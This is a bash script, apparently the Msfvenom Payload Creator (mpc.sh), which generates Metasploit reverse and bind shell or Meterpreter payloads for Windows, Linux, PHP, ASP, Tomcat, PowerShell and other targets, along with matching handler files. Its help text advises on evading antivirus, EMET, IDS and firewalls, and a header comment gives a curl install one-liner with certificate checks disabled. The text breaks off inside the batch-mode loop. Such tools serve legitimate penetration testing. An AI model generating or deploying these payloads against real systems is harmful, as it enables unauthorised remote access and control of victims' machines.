#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: mpc.sh (v1.3.2)             (Update: 2015-08-17) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Linux & Metasploit v4.11+   #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Requires:                                                  #
#    Metasploit Framework v4.11.3-2015062101 or higher        #
#                             ---                             #
#  Useful Manual Commands:                                    #
#    msfvenom --list payloads                                 #
#    msfvenom --list encoders                                 #
#    msfvenom --help-formats                                  #
#                             ---                             #
#  Payload names:                                             #
#    shell_bind_tcp - Single / Inline / NonStaged / Stageless #
#    shell/bind_tcp - Staged (Requires Metasploit)            #
#--Quick Install----------------------------------------------#
#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc; chmod +x /usr/bin/mpc
#-------------------------------------------------------------#


#-More information--------------------------------------------#
#   - https://www.offensive-security.com/metasploit-unleashed/payloads/
#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/
#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom
#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#


##### Variables
OUTPATH="$(pwd)/"      # Others: ./   /tmp/   /var/www/

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

##### Read command line arguments
TYPE=""                #"$(echo ${1} | \tr '[:upper:]' '[:lower:]')"   Defalut: *REQUIRED*
IP=""                  #"${2}"                                         Defalut: *IP menu*
PORT=""                #"${3}"                                         Deafult: 443
SHELL=""               # shell // meterpreter                          Default: meterpreter
DIRECTION=""           # reverse // bind                               Default: reverse
STAGE=""               # staged // stageless                           Default: stageless
METHOD=""              # tcp // http // https // find_port             Default: tcp
VERBOSE=false

##### Default values
SUCCESS=false          # Did we successfully create a payload?
DOMAIN=false           # IP address or domain name?
BATCH=false            # Are we creating multiple payloads (one of each type) ?
LOOP=false             # Are we creating multiple payloads (every possible combination)?
HELP=false             # Display the help screen?

##### (Optional) Enable debug mode?
#set -x


#-Function-------------------------------------------------------------#

## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE
function doAction {
  TYPE="${1}"
  IP="${2}"
  PORT="${3}"
  PAYLOAD="${4}"
  CMD="${5}"
  FILEEXT="${6}"
  SHELL="${7}"
  DIRECTION="${8}"
  STAGE="${9}"
  METHOD="${10}"
  VERBOSE="${11}"

  if [[ -z "${VERBOSE}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}:   doAction TYPE(${TYPE}) IP(${IP}) PORT(${PORT}) PAYLOAD(${PAYLOAD}) CMD(${CMD}) FILEEXT(${FILEEXT}) SHELL(${SHELL}) DIRECTION(${DIRECTION}) STAGE(${STAGE}) METHOD(${METHOD}) VERBOSE(${VERBOSE})" >&2
    exit 2
  fi

  FILENAME="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
  FILEHANDLE="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc"

  X="  IP"
  [[ "${DOMAIN}" == "true" ]] && X='NAME'
  [[ "${VERBOSE}" == "true" ]] && PADDING='     '

  echo -e " ${YELLOW}[i]${RESET}${PADDING} ${X}: ${YELLOW}${IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} PORT: ${YELLOW}${PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${SHELL}${RESET}"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${DIRECTION}${RESET}"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${STAGE}${RESET}"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${METHOD}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING}  CMD: ${BOLD}${CMD}${RESET}"

  [[ -e "${FILENAME}" ]] && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. Overwriting..." && rm -f "${FILENAME}"
  eval "${CMD}" 2>/tmp/mpc.out
  [[ ! -s "${FILENAME}" ]] && rm -f "${FILENAME}"
  if [[ -e "${FILENAME}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
    \chmod +x "${FILENAME}"
  else
    echo ""
    \grep -q 'Invalid Payload Selected' /tmp/mpc.out 2>/dev/null
    if [[ "$?" == '0'  ]]; then
      echo -e " ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
      \rm -f /tmp/mpc.out
    else
      echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
      echo -e "\n----------------------------------------------------------------------------------------"
      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] && \cat /usr/share/metasploit-framework/build_rev.txt || \msfconsole -v
      \uname -a
      echo -e "----------------------------------------------------------------------------------------${RED}"
      \cat /tmp/mpc.out
      echo -e "${RESET}----------------------------------------------------------------------------------------\n"
    fi
    exit 2
  fi
  \rm -f /tmp/mpc.out

  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} File: $(\file -b ${FILENAME})"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} Size: $(\du -h ${FILENAME} | \cut -f1)"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}  MD5: $(\openssl md5 ${FILENAME} | \awk '{print $2}')"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} SHA1: $(\openssl sha1 ${FILENAME} | \awk '{print $2}')"

  cat <<EOF > "${FILEHANDLE}"
#
# RUN:   service postgresql start;service metasploit start; msfconsole -q -r "${FILENAME}"
#
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${IP}
set LPORT ${PORT}
set ExitOnSession false
run -j
EOF
  echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${YELLOW}${FILEHANDLE}${RESET}'   (msfconsole -q -r ${FILEHANDLE})"
  SUCCESS=true
  return
}

## doAction
function doHelp {
  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
  echo -e " ${YELLOW}[i]${RESET}   Example: ${BLUE}${0} windows 192.168.1.10${RESET}        # Windows & manual IP."
  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port."
  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} stageless cmd py https${RESET}      # Python, stageless command prompt."
  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
  echo -e " ${YELLOW}[i]${RESET}            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}TYPE${RESET}>:"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASP${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASPX${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}PHP${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET}]"
  echo ""
  echo -e " ${YELLOW}[i]${RESET} Rather than putting <${BOLD}DOMAIN/IP${RESET}>, you can do a ${YELLOW}interface${RESET} and MPC will detect that IP address."
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}DOMAIN/IP${RESET}> will default to the ${YELLOW}IP menu${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}PORT${RESET}> will default to ${YELLOW}443${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}CMD${RESET}> is a standard/${YELLOW}native command prompt${RESET}/terminal to interactive with."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}MSF${RESET}> is a custom ${YELLOW}cross platform Meterpreter${RESET} shell, gaining the full power of Metasploit."
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}CMD/MSF${RESET}> will default to ${YELLOW}<MSF>${RESET} where possible."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}   Note: Metasploit doesn't (yet!) support <${BOLD}CMD/MSF${RESET}> for every <${BOLD}TYPE${RESET}> format."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <${BOLD}CMD${RESET}> payloads are generally ${YELLOW}smaller${RESET} than <${BOLD}MSF${RESET}> and easier to bypass EMET. Limit Metasploit post modules/scripts support."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <${BOLD}MSF${RESET}> payloads are generally much ${YELLOW}larger${RESET} than <${BOLD}CMD${RESET}>, as it comes with ${YELLOW}more features${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}BIND${RESET}> ${YELLOW}opens a port on the target side${RESET}, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}REVERSE${RESET}> makes ${YELLOW}the target connect back to the attacker${RESET}. The attacker needs an open port. Blocked with engress firewalls rules on the target."
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}BIND/REVERSE${RESET}> will default to ${YELLOW}<REVERSE>${RESET}."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <${BOLD}BIND${RESET}> allows for the ${YELLOW}attacker to connect whenever they wish${RESET}. <${BOLD}REVERSE${RESET}> needs to the target to be repeatedly connecting back to ${YELLOW}permanent maintain access${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}STAGED${RESET}> splits the payload into parts, making it ${YELLOW}smaller but dependent on Metasploit${RESET}."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}STAGELESS${RESET}> is the complete ${YELLOW}standalone payload${RESET}. More 'stable' than <${BOLD}STAGED${RESET}>."
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}STAGED/STAGELESS${RESET}> will default to ${YELLOW}<STAGED>${RESET} where possible."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}   Note: Metasploit doesn't (yet!) support <${BOLD}STAGED/STAGELESS${RESET}> for every <${BOLD}TYPE${RESET}> format."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <STAGED> are 'better' in ${YELLOW}low-bandwidth/high-latency${RESET} environments."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <${BOLD}STAGED${RESET}> may work 'better' with IDS/IPS."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} ${YELLOW}More information${RESET}: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}                   https://www.offensive-security.com/metasploit-unleashed/payload-types/"
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET}                   https://www.offensive-security.com/metasploit-unleashed/payloads/"
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}TCP${RESET}> is the standard method to connecting back. This is the ${YELLOW}most compatible with TYPES as its RAW${RESET}. Can be easily detected on IDSs."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}HTTP${RESET}> makes the ${YELLOW}communication appear to be HTTP traffic${RESET} (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}HTTPS${RESET}> makes the ${YELLOW}communication appear to be (encrypted) HTTP traffic${RESET} using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443."
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}FIND_PORT${RESET}> will ${YELLOW}attempt every port on the target machine, to find a way out${RESET}. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <${BOLD}TYPE${RESET}>."
  echo -e " ${YELLOW}[i]${RESET} Missing <${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}> will default to ${YELLOW}<TCP>${RESET}."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} By altering the traffic, such as <${BOLD}HTTP${RESET}> and even more ${BOLD}<HTTPS${RESET}>, it ${YELLOW}will slow down the communication & increase the payload size${RESET}."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} ${YELLOW}More information${RESET}: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}BATCH${RESET}> will generate ${YELLOW}as many combinations as possible${RESET}: <${BOLD}TYPE${RESET}>, <${BOLD}CMD${RESET} + ${BOLD}MSF${RESET}>, <${BOLD}BIND${RESET} + ${BOLD}REVERSE${RESET}>, <${BOLD}STAGED${RESET} + ${BOLD}STAGLESS${RESET}> & <${BOLD}TCP${RESET} + ${BOLD}HTTP${RESET} + ${BOLD}HTTPS${RESET} + ${BOLD}FIND_PORT${RESET}> "
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}LOOP${RESET}> will just create ${YELLOW}one of each${RESET} <${BOLD}TYPE${RESET}>."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <${BOLD}VERBOSE${RESET}> will display ${YELLOW}more information${RESET}."
  exit 1
}


#-Start----------------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}M${RESET}sfvenom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MPC${RESET} v${BLUE}1.3.2${RESET})"


## Check system
## Are we using Linux? (Sorry OSX users)
if [[ "$(\uname)" != "Linux" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Linux${RESET}" >&2
  exit 3
fi

## msfvenom installed?
if [[ ! -n "$(\which msfvenom)" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
  exit 3
fi

## cURL/wget installed?
if [[ -n "$(\which curl)" || -n "$(\which wget)" ]]; then
  ## Try and get external IP
  WAN=""
  [[ -n "$(\which curl)" ]] && CMD="\curl -s" || CMD="\wget -U 'curl' -qO-"
  for url in 'http://ipinfo.io/ip' 'http://ifconfig.io/'; do
    WAN=$(eval ${CMD} "${url}")
    [[ -n "${WAN}" ]] && break
  done
  [[ "${VERBOSE}" == "true" && -z "${WAN}" ]] && echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}" >&2
fi

## Is there a writeable path for us?
if [[ ! -d "${OUTPATH}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Unable to use ${OUTPATH}${RESET}" >&2
  exit 3
fi


## Get default values (before batch/loop)
[[ -z "${PORT}" ]] && PORT="443"
IFACE=( $(\awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__') )
IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $(\ifconfig "${IFACE[${i}]}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1) ); done    # OSX -> \ifconfig | \grep inet | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}'
TYPEs=( asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}
FORMATs=(          sh    jsp   lin elf  macho  pl         ps1        py      war     win exe )


## Check user input
## Able to detect NIC interfaces?
if [[ -z "${IFACE}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find any network interfaces${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## Able to detect IP addresses?
if [[ -z "${IPs}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## (!!!Magic Alert!!!) Try to predict what's what with inputs...
for x in $(\tr '[:upper:]' '[:lower:]' <<< "$@" ); do
    if [[ "${x}" =~ ^--* ]]; then true                                                                                                        # Long argument? (skip!)
  elif [[ "${x}" == "list" || "${x}" == "ls" || "${x}" == "options" || "${x}" == "show" || "${x}" == "help" ]]; then HELP=true                # List types? (aka help screen)
  elif [[ "${x}" == "verbose" || "${x}" == "v" ]]; then VERBOSE=true                                                                          # Verbose?
  elif [[ "${x}" == "all" || "${x}" == "batch" || "${x}" == "a" ]]; then BATCH=true                                                           # Batch mode?
  elif [[ "${x}" == "loop" || "${x}" == "l" ]]; then LOOP=true                                                                                # Loop mode?
  elif [[ "${x}" == "cmd" || "${x}" == "shell" || "${x}" == "normal" ]]; then SHELL="shell"                                                   # Shell?
  elif [[ "${x}" == "meterpreter" || "${x}" == "msf" || "${x}" == "meterp" ]]; then SHELL="meterpreter"                                       # Meterpreter?
  elif [[ "${x}" == "bind" || "${x}" ==  "listen" ]]; then DIRECTION="bind"                                                                   # Bind payload?
  elif [[ "${x}" == "reverse" || "${x}" == "rev" ]]; then DIRECTION="reverse"                                                                 # Reverse payload? (default)
  elif [[ "${x}" == "staged" || "${x}" == "stager" || "${x}" == "stage" || "${x}" == "small" ]]; then STAGE=true                              # Staged?
  elif [[ "${x}" == "stage"*"less" || "${x}" == "single" || "${x}" == "inline" || "${x}" == "no"* || "${x}" == "full" ]]; then STAGE=false    # Stageless?
  elif [[ "${x}" == "https" || "${x}" == "ssl" || "${x}" == "tls" ]]; then METHOD="https"                                                     # HTTPS payload?
  elif [[ "${x}" == "http" || "${x}" == "www" ]]; then METHOD="http"                                                                          # HTTP payload?
  elif [[ "${x}" == "tcp" ]]; then METHOD="tcp"                                                                                               # TCP payload? (default)
  elif [[ "${x}" == "find"* || "${x}" == "allport"* ]]; then METHOD="find_port"                                                               # Find_Port payload?
  elif [[ "${x}" =~ ^-?[0-9]+$ && "${x}" -gt 1 && "${x}" -lt 65535 ]]; then PORT="${x}"                                                       # Port?
  elif [[ "${x}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then IP="${x}"                                            # IP?
  elif [[ "${x}" == *.* ]]; then IP="${x}"                                                                                                    # Domain/DNS? (weak detection & doesn't support hostname)
  elif [[ "${x}" == "wan" && -n "${WAN}" ]]; then IP="${WAN}"                                                                                 # WAN interface?
  else
    known=false
    for (( i=0; i<${#IFACE[@]}; ++i )); do [[ "${x}" == "${IFACE[${i}]}" ]] && IP="${IPs[${i}]}" && known=true && break; done                 # Interface? (rather than a an IP)
    for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ "${x}" == "${TYPEs[${i}]}" ]] && TYPE="${TYPEs[${i}]}" && known=true && break; done             # Type?
    for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ "${x}" == "${FORMATs[${i}]}" ]] && TYPE="${FORMATs[${i}]}" && known=true && break; done       # Type? (aka formats)
    [[ "${known}" == false ]] && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" && exit 1                         # ...if we got this far, we failed. =(
  fi
done

## If the user defined a value, overwrite it regardless
while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
  opt="${1}";
  shift;
  case "$(echo ${opt} | tr '[:upper:]' '[:lower:]')" in
    -|-- ) break 2;;

    -p|--platform )
       TYPE="${1}"; shift;;
    --platform=* )
       TYPE="${opt#*=}";;
    -t|--type )
       TYPE="${1}"; shift;;
    --type=* )
       TYPE="${opt#*=}";;

    -i|--ip )
       IP="${1}"; shift;;
    --ip=* )
       IP="${opt#*=}";;

    -p|--port )
       PORT="${1}"; shift;;
    --port=* )
       PORT="${opt#*=}";;

    -m|--msf|--meterpreter )
       SHELL="meterpreter";;
    -c|--cmd|--shell )
       SHELL="shell";;
    --shell )
       SHELL="${1}"; shift;;
    --shell=* )
       SHELL="${opt#*=}";;

    -b|--bind|--listen )
       DIRECTION="bind";;
    -r|--rev|--reverse )
       DIRECTION="reverse";;
    --direction )
       DIRECTION="${1}"; shift;;
    --direction=* )
       DIRECTION="${opt#*=}";;

    -s|--staged|--stager )
       STAGE=true;;
    --stageless )
       STAGE=false;;
    --stage )
       STAGE="${1}"; shift;;
    --stage=* )
       STAGE="${opt#*=}";;

    -t|--tcp )
       METHOD="tcp";;
    --http|--www )
       METHOD="http";;
    --https|--ssl|--tls )
       METHOD="https";;
    -f|--find|--all|--find_port|--find-port|--findport|--allports|--all-ports|--all_ports )
       METHOD="find_port";;
    --method )
       METHOD="${1}"; shift;;
    --method=* )
       METHOD="${opt#*=}";;

    -a|--all|--batch )
       BATCH=true;;
    -l|--loop )
       LOOP=true;;

    -v|--verbose )
       VERBOSE=true;;

    -h|--help|-ls|--list|--options )
       HELP=true;;

    *) echo -e " ${YELLOW}[i]${RESET} Invalid option: ${RED}${x}${RESET}" && exit 1;;
   esac
done


## Display help?
[[ "${HELP}" == true ]] && doHelp


## Check input
  if [[ "${SHELL}" == "shell" || "${SHELL}" == "cmd" || "${SHELL}" == "normal" ]]; then SHELL="shell"
elif [[ "${SHELL}" == "meterpreter" || "${SHELL}" == "msf" || "${SHELL}" == "meterp" ]]; then SHELL="meterpreter"; fi
#else SHELL="meterpreter"; fi   # <--- cant due to batch mode (same with [[ -z "${SHELL}" ]])

  if [[ "${DIRECTION}" == "reverse" || "${DIRECTION}" == "rev" ]]; then DIRECTION="reverse"
elif [[ "${DIRECTION}" == "bind" || "${DIRECTION}" == "listen" ]]; then DIRECTION="bind"; fi

  if [[ "${STAGE}" == "true" || "${STAGE}" == "staged" || "${STAGE}" == "stager" || "${STAGE}" == "stage" || "${STAGE}" == "small" ]]; then STAGE='staged'; _STAGE='/'
elif [[ "${STAGE}" == "false" || "${STAGE}" == "stage"*"less" || "${STAGE}" == "single" || "${STAGE}" == "inline" || "${STAGE}" == "no"* || "${STAGE}" == "full" ]]; then STAGE='stageless'; _STAGE='_'; fi

  if [[ "${METHOD}" == "tcp" ]]; then METHOD="tcp"
elif [[ "${METHOD}" == "http" || "${METHOD}" == "www" ]]; then METHOD="http"
elif [[ "${METHOD}" == "https" || "${METHOD}" == "tls" || "${METHOD}" == "ssl" ]]; then METHOD="https"
elif [[ "${METHOD}" == "find"* || "${METHOD}" == "all"* ]]; then METHOD="find_port"; fi

## Did user enter an interface instead of an IP address?
for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=${IPs[${x}]} && break; done

## WAN interface?
if [[ -n "${WAN}" && "${IP}" == "${WAN}" ]]; then
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  "
fi

## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do
    (( ${BASH_REMATCH[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
  done
elif [[ -n "${IP}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
  DOMAIN=true
fi

## Valid port?
if [[ "${PORT}" -lt 1 || "${PORT}" -gt 65535 ]]; then
  echo -e " ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}" >&2
  exit 3
fi


## IP menu
if [[ -n "${TYPE}" && -z "${IP}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET}/${YELLOW}IP address${RESET}?:"
  I=0
  for iface in "${IFACE[@]}"; do
    IPs[${I}]="$(\ifconfig ${iface} | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 | sort)"
    [[ -z "${IPs[${I}]}" ]] && IPs[${I}]="UNKNOWN"
    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"
    I=$[${I}+1]
  done
  [[ -n "${WAN}" ]] && I=$[${I}+1] && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
  _IP=""
  while [[ -z "${_IP}" ]]; do
    echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
    for (( x=0; x<${I}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP="${IPs[${x}]}"; done           # Did user enter interface?
    [[ -n "${WAN}" && "${INPUT}" == "${INPUT}" ]] && _IP="${WAN}"                                             # Did user enter wan?
    [[ "${INPUT}" != *"."* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] && _IP="${IPs[${INPUT}-1]}"        # Did user select number?
    #for ip in "${IPs[@]}"; do [[ "${INPUT}" == "${ip}" ]] && _IP="${ip}"; done                               # Did user enter a known IP?
    [[ "${INPUT}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP="${INPUT}"         # Did the user enter a IP address (doesn't valid it)
    IP="${_IP}"
  done
  echo ""
fi


## Generate #1 (Batch/Looping)
## Loop mode?
if [[ "${LOOP}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Loop Mode. ${BOLD}Creating one of each TYPE${RESET}, with default values"
  [[ "${VERBOSE}" == "true" ]] && _VERBOSE="verbose"
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
    echo ""   # "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
    eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
    echo ""
  done   # for TYPEs[@]
elif [[ "${BATCH}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}"
  [[ "${VERBOSE}" == "true" ]] && _VERBOSE="verbose"
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
